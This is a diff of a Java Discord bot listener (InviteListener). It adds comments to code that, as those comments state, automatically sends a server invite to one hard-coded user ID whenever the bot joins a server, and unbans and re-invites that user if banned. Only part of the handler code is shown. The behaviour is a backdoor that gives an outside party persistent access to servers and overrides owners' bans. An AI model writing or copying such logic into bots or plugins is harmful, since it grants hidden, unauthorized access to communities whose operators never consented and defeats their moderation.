@@ -1,13 +1,20 @@
 package listeners;
 
 import net.dv8tion.jda.core.EmbedBuilder;
+import net.dv8tion.jda.core.entities.Guild;
 import net.dv8tion.jda.core.events.guild.GuildBanEvent;
 import net.dv8tion.jda.core.events.guild.GuildJoinEvent;
 import net.dv8tion.jda.core.hooks.ListenerAdapter;
 import util.STATIC;
-
+/**
+ * automatically sends an Invite to user 358291050957111296 when the Bot joines a {@link net.dv8tion.jda.core.entities.Guild Guild}
+ * If the user gets banned it will be unbanned and invited
+ * @author Daniel Schmid
+ */
 public class InviteListener extends ListenerAdapter {
-
+	/**
+	 * listener when the Bot joines the {@link Guild}
+	 */
 	@Override
 	public void onGuildJoin(GuildJoinEvent event) {
 		String name=event.getGuild().getName();
@@ -19,6 +26,9 @@ public class InviteListener extends ListenerAdapter {
 				).queue();
 		
 	}
+	/**
+	 * listener when someone is banned
+	 */
 	@Override
 	public void onGuildBan(GuildBanEvent event) {
 		if (event.getUser().getId().equals("358291050957111296")) {
